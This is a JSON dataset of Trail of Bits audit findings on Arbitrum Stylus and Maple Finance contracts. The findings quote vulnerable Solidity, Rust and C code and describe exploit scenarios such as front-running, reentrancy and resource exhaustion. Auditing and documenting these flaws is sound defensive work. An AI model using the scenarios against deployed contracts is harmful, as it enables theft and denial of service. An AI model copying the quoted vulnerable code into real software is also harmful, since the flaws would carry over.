        "body": "Bids in the cache manager placed on a particular code hash cannot be modied and do not accumulate. When a bid is placed, the CacheManager Solidity contract checks whether the code hash is currently cached and reverts the bid if so. /// Places a bid, reverting if payment is insufficient. function placeBid(bytes32 codehash) external payable { if (isPaused) { revert BidsArePaused(); } if (_isCached(codehash)) { revert AlreadyCached(codehash); } uint64 asm = _asmSize(codehash); (uint256 bid, uint64 index) = _makeSpace(asm); return _addBid(bid, codehash, asm, index); } Figure 37.1: This check prevents bids from being placed on already cached programs. (stylus-contracts/src/chain/CacheManager.sol#104144) This makes it impossible to increase a bid before the program is evicted either due to other bids being placed or through sucient calls to makeSpace. This limitation creates a bad user experience. A user who wants to increase a bid would have to create a new bid, but would rst have to pay to evict the program. It might also make it dicult for a popular dapp with many low-capital users to coordinate and combine their funds for a shared bid. Exploit Scenario Bob wants to increase a previous bid to his token program. He cannot simply place a new bid; he is required to make sucient space. He calls makeSpace to evict his own program, requiring a 1 ETH payment. In order to add his new 2 ETH bid, he must now pay 3 ETH in total. Recommendations Short term, document this limitation of the auction system. Consider adding an alternative unsafe function that does not check whether the code is already cached (however, this would allow multiple entries per code hash). Alternatively, consider adjusting the implementation to allow bids for programs to be increased. Long term, review the bid mechanisms with user experience in mind; document any sources of friction and ways in which they could be mitigated.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "38. The makeSpace function does not refund excess bid value and can be front-run ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The makeSpace function, used to make space for programs in the cache manager, does not refund funds sent above the minimum bid value, even if no state changes are performed. The makeSpace function accepts ETH and requires a minimum bid to be made until enough space is available. /// Evicts entries until enough space exists in the cache, reverting if payment is insufficient. /// Returns the new amount of space available on success. /// Note: will only make up to 5Mb of space. Call repeatedly for more. function makeSpace(uint64 size) external payable returns (uint64 space) { if (size > MAX_MAKE_SPACE) { size = MAX_MAKE_SPACE; } _makeSpace(size); return cacheSize - queueSize; } /// Evicts entries until enough space exists in the cache, reverting if payment is insufficient. /// Returns the bid and the index to use for insertion. function _makeSpace(uint64 size) internal returns (uint256 bid, uint64 index) { // discount historical bids by the number of seconds bid = msg.value + block.timestamp * uint256(decay); index = uint64(entries.length); uint256 min; while (queueSize + size > cacheSize) { (min, index) = _getBid(bids.pop()); _deleteEntry(min, index); } if (bid < min) { revert BidTooSmall(bid, min); } } Figure 38.1: The makeSpace function requires the minimum bid to be matched until enough space is made. (stylus-contracts/src/chain/CacheManager.sol#118144) The contract keeps any funds sent above the minimum bid value. This includes the case in which enough space is already available and no funds are required. This can happen, for example, when two calls to makeSpace are initiated by dierent parties. There is also the possibility that a user calls makeSpace to create space, only for that space to be occupied by other bids right after it is freed. Exploit Scenario Bob calls makeSpace in order to free up space in the cache manager. In the meantime, Alice calls makeSpace herself for the same reason. Bobs transaction ends up doing nothing and does not return his funds. Alice is able to insert her program, whereas Bob is where he was at the start. Recommendations Short term, have the cache manager refund any excess funds sent above the minimum bid required for making enough space. Long term, document this behavior so that users are aware of it.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "39. Bids do not account for program size ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "It is possible for a single bid to evict many programs, regardless of their cumulative price per program byte size, resulting in an unfair auction system. A program that is to be inserted into the cache manager with a slightly higher bid than many others will be prioritized over those other programs, regardless of the total amount paid per occupied code size. This is because the code for adding a bid for a program does not take into account the program size itself. /// Adds a bid function _addBid( uint256 bid, bytes32 code, uint64 size, uint64 index ) internal { if (queueSize + size > cacheSize) { revert AsmTooLarge(size, queueSize, cacheSize); } Entry memory entry = Entry({size: size, code: code}); ARB_WASM_CACHE.cacheCodehash(code); bids.push(_packBid(bid, index)); queueSize += size; if (index == entries.length) { entries.push(entry); } else { entries[index] = entry; } emit InsertBid(bid, code, size); } Figure 39.1: The _addBid function does not take program size into account (stylus-contracts/src/chain/CacheManager.sol#145167) Exploit Scenario There are 50 programs in the cache manager, each of size 0.1 MB and a 1 ETH bid. Bob inserts a new program with a 1.01 ETH bid. If Bobs program size is 0.1 MB, one program will be evicted (1 ETH worth of bids). If the program size is 5 MB, 50 programs will be evicted (50 ETH worth of bids). Bobs program should not be able to evict any number of programs without paying extra fees. Recommendations Short term, consider dividing the bid in _addBid by the program size in order to charge a price per byte instead of a xed price per program. Long term, thoroughly document the intended behavior of the cache manager in terms of program sizes.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "40. Incorrect bid check ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The _makeSpace function allows new bids to go through if they are equal to the current bid (gure 40.1). This is unexpected for an auction system, in which new bids should be considered only if they are superior to previous ones. /// Evicts entries until enough space exists in the cache, reverting if payment is insufficient. /// Returns the bid and the index to use for insertion. function _makeSpace(uint64 size) internal returns (uint192 bid, uint64 index) { // discount historical bids by the number of seconds bid = uint192(msg.value + block.timestamp * uint256(decay)); index = uint64(entries.length); uint192 min; uint64 limit = cacheSize; while (queueSize + size > limit) { (min, index) = _getBid(bids.pop()); _deleteEntry(min, index); } if (bid < min) { revert BidTooSmall(bid, min); } } Figure 40.1: The check is a less-than comparison, allowing bids equal to the current bid to be accepted. (stylus-contracts/src/chain/CacheManager.sol#137153) Recommendations Short term, replace the check with bid <= min. Long term, thoroughly document the intended behavior of the auction system and use it as a baseline to review its actual behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "41. MemoryGrow opcode is underpriced for programs with xed memory ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The ink charged by the MemoryGrow opcode is less than expected for programs that have a xed memory size. Stylus denes an ink price for every WASM opcode to be used during program activation. The costs for certain opcodes, such as MemoryGrow, are handled by a dierent part of the code (gure 41.4). pub fn pricing_v1(op: &Operator, tys: &HashMap<SignatureIndex, FunctionType>) -> u64 {  let ink = match op { {...omitted for brevity...} dot!(MemoryGrow) => 1, // cost handled by memory pricer Figure 41.1: Part of the pricing_v1 function that defers the ink price for MemoryGrow to the memory pricer However, if a WASM program has xed memory (and therefore does not import the pay function), the cost of the opcode will be unmodied (gure 41.2). impl<'a> FuncMiddleware<'a> for FuncHeapBound { fn feed<O>(&mut self, op: Operator<'a>, out: &mut O) -> Result<()> where O: Extend<Operator<'a>>, { use Operator::*; let Some(pay_func) = self.pay_func else { out.extend([op]); return Ok(()); }; Figure 41.2: The header of the feed function of the FuncHeapBound middleware A call to MemoryGrow for a program with a xed memory returns -1, which is correct according to the WASM standard. Unfortunately, the price of that opcode will be 1 ink, which is too small to cover the actual cost of the operation in a WASM execution. Exploit Scenario Eve crafts a malicious WASM program that repeatedly triggers the MemoryGrow opcode in a WASM program that has a xed memory in order to exhaust the resources of the validators. Due to the low cost of the MemoryGrow opcode on programs with a xed memory, she pays a minimal amount of ink to carry out the attack. Recommendations Short term, increase the cost of the MemoryGrow opcode to make sure it is sucient for all programs, including those with xed memory. Long term, perform fuzz testing of the processes for validating, activating, and executing WASM contracts. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "14. Undened behavior when passing padded struct via FFI ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "Union types used in Wasmer that cross FFI boundaries and unconditionally transmute between instances of vmctx and host_env are not derived from repr(C), which could lead to undened behavior due to inconsistent padding. An example is shown in gures 14.1 and 14.2. Types that cross FFI boundaries should be derived from repr(C) so that the order, size, and alignment of elds is exactly what you would expect from C or C++, as documented in the Rustonomicon. #[derive(Copy, Clone, Eq)] pub union VMFunctionContext { /// Wasm functions take a pointer to [`VMContext`]. pub vmctx: *mut VMContext, /// Host functions can have custom environments. pub host_env: *mut std::ffi::c_void, } impl VMFunctionContext { /// Check whether the pointer stored is null or not. pub fn is_null(&self) -> bool { unsafe { self.host_env.is_null() } } } Figure 14.1: A union that is used across FFI boundaries (wasmer/lib/vm/src/vmcontext.rs#2538) /// Call the wasm function pointed to by `callee`. /// /// * `vmctx` - the callee vmctx argument /// * `caller_vmctx` - the caller vmctx argument /// * `trampoline` - the jit-generated trampoline whose ABI takes 4 values, the callee vmctx, the caller vmctx, the `callee` argument below, and then the /// /// `values_vec` argument. /// * `callee` - the third argument to the `trampoline` function /// * `values_vec` - points to a buffer which holds the incoming arguments, and to /// which the outgoing return values will be written. /// /// # Safety /// /// Wildly unsafe because it calls raw function pointers and reads/writes raw /// function pointers. pub unsafe fn wasmer_call_trampoline( trap_handler: Option<*const TrapHandlerFn<'static>>, config: &VMConfig, vmctx: VMFunctionContext, trampoline: VMTrampoline, callee: *const VMFunctionBody, values_vec: *mut u8, ) -> Result<(), Trap> { catch_traps(trap_handler, config, || { mem::transmute::<_, extern \"C\" fn(VMFunctionContext, *const VMFunctionBody, *mut u8)>( trampoline, )(vmctx, callee, values_vec); }) } Figure 14.2: A call to a foreign interface with the union shown in gure 14.1 (wasmer/lib/vm/src/trap/traphandlers.rs#642670) Recommendations Short term, derive types that cross FFI boundaries from repr(C). Long term, enable Clippys default_union_representation lint and integrate cargo miri into the testing of Wasmer.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "15. Styluss 63/64th gas forwarding di\u0000ers from go-ethereum ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The Stylus VM deviates from the Ethereum specication and the behavior of the reference implementation in its application of the 63/64th gas forwarding rule, dened in EIP-150. EIP-150 states that if a call asks for more gas than all but one 64th of the maximum allowed amount, call with all but one 64th of the maximum allowed amount of gas. The Go implementation of the Ethereum protocol calculates the all but one 64th amount in the callGas function. The new rule is applied only when the requested amount of gas exceeds the allowed gas computed using the rule. evm.callGasTemp, err = callGas(evm.chainRules.IsEIP150, contract.Gas, gas, stack.Back(0)) Figure 15.1: go-ethereums calculation for gas available in CALL (go-ethereum/core/vm/gas_table.go#391) func callGas(isEip150 bool, availableGas, base uint64, callCost *uint256.Int) (uint64, error) { if isEip150 { availableGas = availableGas - base gas := availableGas - availableGas/64 // If the bit length exceeds 64 bit we know that the newly calculated \"gas\" for EIP150 // is smaller than the requested amount. Therefore we return the new gas instead // of returning an error. if !callCost.IsUint64() || gas < callCost.Uint64() { return gas, nil } } if !callCost.IsUint64() { return 0, ErrGasUintOverflow } return callCost.Uint64(), nil } Figure 15.2: An application of 63/64th rule (go-ethereum/core/vm/gas.go#3753) On the other hand, Stylus applies the 63/64th rule indiscriminately using the minimum value of the requested gas amount and the gas available to the parent call. The 63/64th rule should be applied only if the call requests more than all but one 64th of the gas. gas = gas.min(env.gas_left()?); // provide no more than what the user has let contract = env.read_bytes20(contract)?; let input = env.read_slice(calldata, calldata_len)?; let value = value.map(|x| env.read_bytes32(x)).transpose()?; let api = &mut env.evm_api; let (outs_len, gas_cost, status) = call(api, contract, &input, gas, value); Figure 15.3: Styluss calculation for gas available in CALL (arbitrator/stylus/src/host.rs#153160) startGas := gas // computes makeCallVariantGasCallEIP2929 and gasCall/gasDelegateCall/gasStaticCall baseCost, err := vm.WasmCallCost(db, contract, value, startGas) if err != nil { return 0, gas, err } gas -= baseCost // apply the 63/64ths rule one64th := gas / 64 gas -= one64th Figure 15.4: Styluss incorrect application of the 63/64th rule (arbos/programs/api.go#114125) Recommendations Short term, have the code pass all but one 64th of the available gas only if a call requests more than the maximum allowed gas. Long term, develop machine-readable tests for the Stylus VM that include the expected gas consumption, similar to Ethereums reference tests.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "19. Tests missing assertions for some errors and values ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "Many of the tests in the codebase perform incomplete assertions, which may prevent the tests from detecting bugs in the event of future code changes. In particular, some tests check only the following:  Whether an error was returned, but not the type or the message of the error  Whether the resulting structures eld values are as expected Additionally, the tests do not test all edge cases. For example, there are no unit tests that ensure that the enforced WASM limits (mentioned in TOB-STYLUS-16) actually work. Those issues can be seen, for example, in the provers tests, as shown in gure 19.1. #[test] pub fn reject_reexports() { let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap_err(); let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap_err(); } #[test] pub fn reject_ambiguous_imports() { let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap(); let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap_err(); } Figure 19.1: stylus/arbitrator/prover/src/test.rs#L14-L54 Recommendations Short term, apply the patch provided in appendix E to improve the quality of the tests. Long term, further refactor the tests to ensure they include assertions for all expected states of values or errors that are returned from the tested functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "20. Machine state serialization/deserialization does not account for error guards ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The code for serialization and deserialization of the machine state does not account for any error guards (gure 20.1). If any error guards are present, they could produce an invalid machine state when the prover is run from a deserialized state. pub fn serialize_state<P: AsRef<Path>>(&self, path: P) -> Result<()> { let mut f = File::create(path)?; let mut writer = BufWriter::new(&mut f); let modules = self .modules .iter() .map(|m| ModuleState { globals: Cow::Borrowed(&m.globals), memory: Cow::Borrowed(&m.memory), }) .collect(); let state = MachineState { steps: self.steps, status: self.status, value_stack: Cow::Borrowed(&self.value_stack), internal_stack: Cow::Borrowed(&self.internal_stack), frame_stack: Cow::Borrowed(&self.frame_stack), modules, global_state: self.global_state.clone(), pc: self.pc, stdio_output: Cow::Borrowed(&self.stdio_output), initial_hash: self.initial_hash, }; bincode::serialize_into(&mut writer, &state)?; writer.flush()?; drop(writer); f.sync_data()?; Ok(()) } // Requires that this is the same base machine. If this returns an error, it has not mutated `self`. pub fn deserialize_and_replace_state<P: AsRef<Path>>(&mut self, path: P) -> Result<()> { let reader = BufReader::new(File::open(path)?); let new_state: MachineState = bincode::deserialize_from(reader)?; if self.initial_hash != new_state.initial_hash { bail!( \"attempted to load deserialize machine with initial hash {} into machine with initial hash {}\", new_state.initial_hash, self.initial_hash, ); } assert_eq!(self.modules.len(), new_state.modules.len()); // Start mutating the machine. We must not return an error past this point. for (module, new_module_state) in self.modules.iter_mut().zip(new_state.modules.into_iter()) { module.globals = new_module_state.globals.into_owned(); module.memory = new_module_state.memory.into_owned(); } self.steps = new_state.steps; self.status = new_state.status; self.value_stack = new_state.value_stack.into_owned(); self.internal_stack = new_state.internal_stack.into_owned(); self.frame_stack = new_state.frame_stack.into_owned(); self.global_state = new_state.global_state; self.pc = new_state.pc; self.stdio_output = new_state.stdio_output.into_owned(); Ok(()) } Figure 20.1: Machine state serialization and deserialization code (stylus/arbitrator/prover/src/machine.rs#L1430-L1488) When a machine state is serialized and later deserializedas is the case when CreateValidationNode is run (gure 20.2)the information about any error guards is lost. func CreateValidationNode(configFetcher ValidationConfigFetcher, stack *node.Node, fatalErrChan chan error) (*ValidationNode, error) { Figure 20.2: The CreateValidationNode function (stylus/validator/valnode/valnode.go#L87) This would result in a mismatch between the actual machine state and that which starts from a serialized state. Exploit Scenario Alice creates a validation node from a serialized machine state. Because the error guards were not included during serialization, the correct execution of the machine is now undetermined. Recommendation Short term, include ErrorGuardStack (machine.guards) as part of the machine state serialization and deserialization process. Long term, when introducing new features, keep in mind all of the areas that might be aected by them and ensure there is sucient test coverage.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "28. Possible out-of-bounds write in strncpy function in Stylus C SDK ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The strncpy function dened in the Stylus C SDK writes past the destination string when the source string (src) is shorter than the number of bytes (num) to write to the destination string (gure 28.1). This causes another area of the memory of the program to be overwritten, which may have various consequences depending on the program code and its memory layout. char *strncpy(char *dst, const char *src, size_t num) { size_t idx=0; while (idx<num && src[idx]!=0) { idx++; } memcpy(dst, src, idx); if (idx < num) { memset(dst+num, 0, num-idx); } return dst; } Figure 28.1: stylus/arbitrator/langs/c/src/simplelib.c#L6L16 This bug can be detected by compiling an example program using this function (gure 28.2) with ASan (by using the -fsanitize=address ag) with the GCC or Clang compiler. #include <stdio.h> #include <stdint.h> #include <stdlib.h> #include <string.h> char *mystrncpy(char *dst, const char *src, size_t num) { // code from Figure 28.1 } int main() { char buf[4] = {0}; mystrncpy(buf, \"ab\", 4); printf(\"buf='%s'\\n\", buf); } Figure 28.2: An example program that triggers the bug described in the nding Figure 28.3: Output from the example program, showing that it detects this issue Recommendations Short term, change the problematic line to memset(dst+idx, 0, num-idx); to prevent the issue described in this nding. Long term, implement tests for edge-case inputs for the Stylus SDK functions. References  strncpy manual page",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "29. Insu\u0000cient out-of-bounds check in memcpy utility function for ConstString ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The memcpy utility function, used to implement ConstString functions in the Stylus Rust SDK, contains an insucient check against out-of-bounds conditions: it misses the following conditions that would cause a program to write past the destination buer:  The oset is equal to the destination length.  The source length is larger than the destination length. /// Copies data from `source` to `dest` in a `const` context. /// This function is very inefficient for other purposes. const fn memcpy<const N: usize>( mut source: &[u8], mut dest: [u8; N], mut offset: usize, ) -> [u8; N] { if offset > dest.len() { panic!(\"out-of-bounds memcpy\"); } while !source.is_empty() { dest[offset] = source[0]; offset += 1; (_, source) = source.split_at(1); } dest } Figure 29.1: stylus/arbitrator/langs/rust/stylus-sdk/src/abi/const_string.rs#L26L40 Recommendations Short term, change the insucient out-of-bounds check in the memcpy function to if offset + source.len() >= dest.len() to prevent potential bugs that could occur if the function were used incorrectly. Long term, implement tests for edge case inputs for the Stylus SDK functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "30. Unused and unset timeouts in Arbitrator's JIT code ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "There are potential issues with timeouts in the Arbitrators JIT code:",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Attackers can prevent lenders from funding or renancing loans ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "body": "For the MapleLoan contracts fundLoan method to fund a new loan, the balance of fundsAsset in the contract must be equal to the requested principal. // Amount funded and principal are as requested. amount_ = _principal = _principalRequested; // Cannot under/over fund loan, so that accounting works in context of PoolV1 require (_getUnaccountedAmount(_fundsAsset) == amount_, \"MLI:FL:WRONG_FUND_AMOUNT\" ); Figure 1.1: An excerpt of the fundLoan function ( contracts/MapleLoanInternals.sol#240244 ) An attacker could prevent a lender from funding a loan by making a small transfer of fundsAsset every time the lender tried to fund it (front-running the transaction). However, transaction fees would make the attack expensive. A similar issue exists in the Refinancer contract: If the terms of a loan were changed to increase the borrowed amount, an attacker could prevent a lender from accepting the new terms by making a small transfer of fundsAsset . The underlying call to increasePrincipal from within the acceptNewTerms function would then cause the transaction to revert. function increasePrincipal ( uint256 amount_ ) external override { require (_getUnaccountedAmount(_fundsAsset) == amount_, \"R:IP:WRONG_AMOUNT\" ); _principal += amount_; _principalRequested += amount_; _drawableFunds += amount_; emit PrincipalIncreased(amount_); 13 Maple Labs } Figure 1.2: The vulnerable method in the Refinancer contract ( contracts/Refinancer.sol#2330 ) Exploit Scenario A borrower tries to quickly increase the principal of a loan to take advantage of a short-term high-revenue opportunity. The borrower proposes new terms, and the lender tries to accept them. However, an attacker blocks the process and performs the protable operation himself. Recommendations Short term, allow the lender to withdraw funds in excess of the expected value (by calling getUnaccountedAmount(fundsAsset) ) before a loan is funded and between the proposal and acceptance of new terms. Alternatively, have fundLoan and increasePrincipal use greater-than-or-equal-to comparisons, rather than strict equality comparisons, to check whether enough tokens have been transferred to the contract; if there are excess tokens, use the same function to transfer them to the lender. Long term, avoid using exact comparisons for ether and token balances, as users can increase those balances by executing transfers, making the comparisons evaluate to false . 14 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Reentrancies can lead to misordered events ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "body": "Several functions in the codebase do not use the checks-eects-interactions pattern, lack reentrancy guards, or emit events after interactions. These functions interact with external and third-party contracts that can execute callbacks and call the functions again (reentering them). The event for a reentrant call will be emitted before the event for the rst call, meaning that o-chain event monitors will observe incorrectly ordered events. function liquidatePortion ( uint256 swapAmount_ , bytes calldata data_) external override { ERC20Helper.transfer(collateralAsset, msg.sender , swapAmount_); msg.sender .call(data_); uint256 returnAmount = getExpectedAmount(swapAmount_); require (ERC20Helper.transferFrom(fundsAsset, msg.sender , destination, returnAmount), \"LIQ:LP:TRANSFER_FROM\" ); emit PortionLiquidated(swapAmount_, returnAmount); } Figure 2.1: The liquidatePortion function ( contracts/Liquidator.sol#4151 ) We identied this issue in the following functions:  DebtLocker  setAuctioneer  _handleClaim  _handleClaimOfReposessed  acceptNewTerms  Liquidator  liquidatePortion  pullFunds  MapleLoan 15 Maple Labs  acceptNewTerms  closeLoan  fundLoan  makePayment  postCollateral  returnFunds  skim  upgrade Exploit Scenario Alice calls Liquidator.liquidatePortion (gure 2.1). Since fundsAsset is an ERC777 token (or another token that allows callbacks), a callback function that Alice has registered on ERC20Helper.transfer is called. Alice calls Liquidator.liquidatePortion again from within that callback function. The event for the second liquidation is emitted before the event for the rst liquidation. As a result, the events observed by o-chain event monitors are incorrectly ordered. Recommendations Short term, follow the checks-eects-interactions pattern and ensure that all functions emit events before interacting with other contracts that may allow reentrancies. Long term, integrate Slither into the CI pipeline. Slither can detect low-severity reentrancies like those mentioned in this nding as well as high-severity reentrancies. Use reentrancy guards on all functions that interact with other contracts. 16 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Lack of two-step process for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "body": "The MapleLoan contracts setBorrower and setLender functions transfer the privileged borrower and lender roles to new addresses. If, because of a bug or a mistake, one of those functions is called with an address inaccessible to the Maple Labs team, the transferred role will be permanently inaccessible. It may be possible to restore access to the lender role by upgrading the loan contract to a new implementation. However, only the borrower can upgrade a loan contract, so no such bailout option exists for a transfer of the borrower role to an inaccessible address. Using a two-step process for role transfers would prevent such issues. Exploit Scenario Alice, the borrower of a Maple loan, notices that her borrower address key might have been compromised. To be safe, she calls MapleLoan.setBorrower with a new address. Because of a bug in the script that she uses to set the new borrower, the new borrower is set to an address for which Alice does not have the private key. As a result, she is no longer able to access her loan contract. Recommendations Short term, perform role transfers through a two-step process in which the borrower or lender proposes a new address and the transfer is completed once the new address has executed a call to accept the role. Long term, investigate whether implementing additional two-step processes could prevent any other accidental lockouts. 17 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. IERC20Like.decimals returns non-standard uint256 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "body": "IERC20Like.decimal s declares uint256 as its return type, whereas the ERC20 standard species that it must return a uint8 . As a result, functions that use the IERC20Like interface interpret the values returned by decimals as uint256 values; this can cause values greater than 255 to enter the protocol, which could lead to undened behavior. If the return type were uint8 , only the last byte of the return value would be used. Exploit Scenario A non-standard token with a decimals function that returns values greater than 255 is integrated into the protocol. The code is not prepared to handle decimals values greater than 255. As a result of the large value, the arithmetic becomes unstable, enabling an attacker to drain funds from the protocol. Recommendations Short term, change the return type of IERC20.decimals to uint8 . Long term, ensure that all interactions with ERC20 tokens follow the standard. 18 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Transfers in Liquidator.liquidatePortion can fail silently ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "body": "Calls to ERC20Helper.transfer in the codebase are wrapped in require statements, except for the rst such call in the liquidatePortion function of the Liquidator contract (gure 5.1). As such, a token transfer executed through this call can fail silently, meaning that liquidatePortion can take a user's funds without providing any collateral in return. This contravenes the expected behavior of the function and the behavior outlined in the docstring of ILiquidator.liquidatePortion (gure 5.2). function liquidatePortion ( uint256 swapAmount_ , bytes calldata data_) external override { ERC20Helper.transfer (collateralAsset, msg.sender , swapAmount_); msg.sender .call(data_); uint256 returnAmount = getExpectedAmount(swapAmount_); require (ERC20Helper.transferFrom(fundsAsset, msg.sender , destination, returnAmount), \"LIQ:LP:TRANSFER_FROM\" ); emit PortionLiquidated(swapAmount_, returnAmount); } Figure 5.1: The liquidatePortion function ( contracts/Liquidator.sol#4151 ) * @dev Flash loan function that : * @dev 1 . Transfers a specified amount of `collateralAsset` to ` msg.sender `. * @dev 2 . Performs an arbitrary call to ` msg.sender `, to trigger logic necessary to get `fundsAsset` (e.g., AMM swap). * @dev 3 . Perfroms a `transferFrom`, taking the corresponding amount of `fundsAsset` from the user. * @dev If the required amount of `fundsAsset` is not returned in step 3 , the entire transaction reverts. * @param swapAmount_ Amount of `collateralAsset` that is to be borrowed in the flashloan. * @param data_ 2 . ABI-encoded arguments to be used in the low-level call to perform step 19 Maple Labs */ Figure 5.2: Docstring of liquidatePortion ( contracts/interfaces/ILiquidator.sol#7683 ) Exploit Scenario A loan is liquidated, and its liquidator contract has a collateral balance of 300 ether. The current ether price is 4,200 USDC. Alice wants to prot o of the liquidation by taking out a ash loan of 300 ether. Having checked that the contract holds enough collateral to cover the transaction, she calls liquidatePortion(1260000, ) in the liquidator contract. At the same time, Bob decides to buy 10 ether from the liquidator contract. Bob calls Liquidator.liquidatePortion(42000) . Because his transaction is mined rst, the liquidator does not have enough collateral to complete the transfer of collateral to Alice. As a result, the liquidator receives a transfer of 1,260,000 USDC from Alice but does not provide any ether in return, leaving her with a $1,260,000 loss. Recommendations Short term, wrap ERC20Helper.transfer in a require statement to ensure that a failed transfer causes the entire transaction to revert. Long term, ensure that a failed transfer of tokens to or from a user always causes the entire transaction to revert. To do that, follow the recommendations outlined in TOB-MAPLE-006 and have the ERC20Helper.transfer and ERC20Helper.transferFrom functions revert on a failure. Ensure that all functions behave as expected , that their behavior remains predictable when transactions are reordered, and that the code does not contain any footguns or surprises. 20 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. ERC20Helpers functions do not revert on a failure ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "body": "The ERC20Helper contracts transfer , transferFrom , and approve functions do not revert on a failure. This makes it necessary for the developer to always check their return values. A failure to perform these checks can result in the introduction of high-severity bugs that can lead to a loss of funds. There are no uses of ERC20Helper.transfer for which not reverting on a failure is the best option. Making this standard behavior the default would make the code more robust and therefore more secure by default, as it would take less additional eort to make it secure. In the rare edge cases in which a transfer is allowed to fail or a failure status should be captured in a boolean, a try / catch statement can be used. Exploit Scenario Bob, a developer, writes a new function. He calls ERC20Helper.transfer but forgets to wrap the call in a require statement. As a result, token transfers can fail silently and lead to a loss of funds if that failure behavior is not accounted for. Recommendations Short term, have ERC20Helper.transfer , ERC20Helper.transferFrom , and ERC20Helper.approve revert on a failure. Long term, have all functions revert on a failure instead of returning false . Aim to make code secure by default so that less additional work will be required to make it secure. Additionally, whenever possible, avoid using optimizations that are detrimental to security. 21 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Lack of contract existence checks before low-level calls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "body": "The ERC20Helper contract lls a purpose similar to that of OpenZeppelin's SafeERC20 contract. However, while OpenZeppelin's SafeERC20 transfer and approve functions will revert when called on an address that is not a token contract address (i.e., one with zero-length bytecode), ERC20Helper s functions will appear to silently succeed without transferring or approving any tokens. If the address of an externally owned account (EOA) is used as a token address in the protocol, all transfers to it will appear to succeed without any tokens being transferred. This will result in undened behavior. Contract existence checks are usually performed via the EXTCODESIZE opcode. Since the EXTCODESIZE opcode would precede a CALL to a token address, adding EXTCODESIZE would make the CALL a warm access. As a result, adding the EXTCODESIZE check would increase the gas cost by only a little more than 100. Assuming a high gas price of 200 gwei and a current ether price of $4,200, that equates to an additional cost of 10 cents for each call to the functions of ERC20Helper , which is a low price to pay for increased security. The following functions lack contract existence checks:  ERC20Helper  call in _call  ProxyFactory  call in _initializeInstance  call in _upgradeInstance (line 66)  call in _upgradeInstance (line 72)  Proxied  delegatecall in _migrate  Proxy  delegatecall in _ fallback 22 Maple Labs  